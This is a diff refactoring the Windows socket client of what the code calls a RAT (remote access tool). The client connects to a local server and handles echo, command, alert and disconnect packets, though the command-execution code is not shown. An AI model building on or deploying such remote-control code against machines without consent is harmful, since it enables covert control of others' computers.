@@ -1,21 +1,20 @@
-#include "client.h"
-
 #include "commands.h"
 #include "log.h"
+#include "net_util.h"
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <winsock.h>
 
-int client(int debug) {
+
+static SOCKET init_client() {
   AddrInfo *result, *ptr, hints;
-  uint8_t *data;
   result = ptr = NULL;
   setaddrinfo(&hints, CLIENT);
   if (getaddrinfo(LOCAL_HOST, DEFAULT_PORT, &hints, &result) != 0) {
     LOG_DEBUG("getaddrinfo failed with error: %d", WSAGetLastError());
-    return 1;
+    return INVALID_SOCKET;
   }
   SOCKET server = INVALID_SOCKET;
   if (ptr == result) {
@@ -26,29 +25,41 @@ int client(int debug) {
   if (server == INVALID_SOCKET) {
     LOG_DEBUG("socket creating failed with error %d", WSAGetLastError());
     freeaddrinfo(result);
-    return 1;
+    return INVALID_SOCKET;
   }
   if (connect(server, result->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
     closesocket(server);
     server = INVALID_SOCKET;
   }
   freeaddrinfo(result);
-  if (server == INVALID_SOCKET) {
-    LOG_DEBUG("error: unable to connect to the server");
+  return server;
+}
+
+int main() {
+  WSADATA wsa;
+  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+    LOG_ERR("init error: %d\n", WSAGetLastError());
     return 1;
   }
+  SOCKET server = init_client();
+  if (server == INVALID_SOCKET) {
+    LOG_DEBUG("error: unable to connect to the server");
+    WSACleanup();
+    return 1;
+  }
+  uint8_t *data;
   char buf[DEFAULT_BUFLEN];
   ratpacket_t *p = (ratpacket_t *)buf;
   while (1) {
     int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
     if (sentbytes == 0) {
       LOG_DEBUG("closing connection...");
-      return 1;
+      goto exit;
     }
     if (sentbytes < 0) {
       LOG_DEBUG("recv failed with %d", WSAGetLastError());
       closesocket(server);
-      return 1;
+      goto exit;
     }
     switch (p->op) {
     case RAT_PACKET_ECHO:
@@ -58,7 +69,7 @@ int client(int debug) {
           SOCKET_ERROR) {
         LOG_DEBUG("send failed with %d", WSAGetLastError());
         closesocket(server);
-        return 1;
+        goto exit;
       }
       LOG_DEBUG("echo completed\n");
       break;
@@ -75,7 +86,7 @@ int client(int debug) {
       LOG_DEBUG("cmd packet completed");
       break;
     case RAT_PACKET_DISCONNECT:
-      goto DONE;
+      goto exit;
     case RAT_PACKET_ALERT:
       sentbytes = recv(server, (char *)p->data, p->data_len, 0);
       alert_t *alert = (alert_t *)p->data;
@@ -109,13 +120,11 @@ int client(int debug) {
       break;
     }
   }
-DONE:
+exit:
   if (shutdown(server, SD_SEND) == SOCKET_ERROR) {
-    if (debug)
-      printf("shutdown failed, error: %d", WSAGetLastError());
-    closesocket(server);
-    return 1;
+    LOG_DEBUG("shutdown failed, error: %d", WSAGetLastError());
   }
   closesocket(server);
+  WSACleanup();
   return 0;
 }
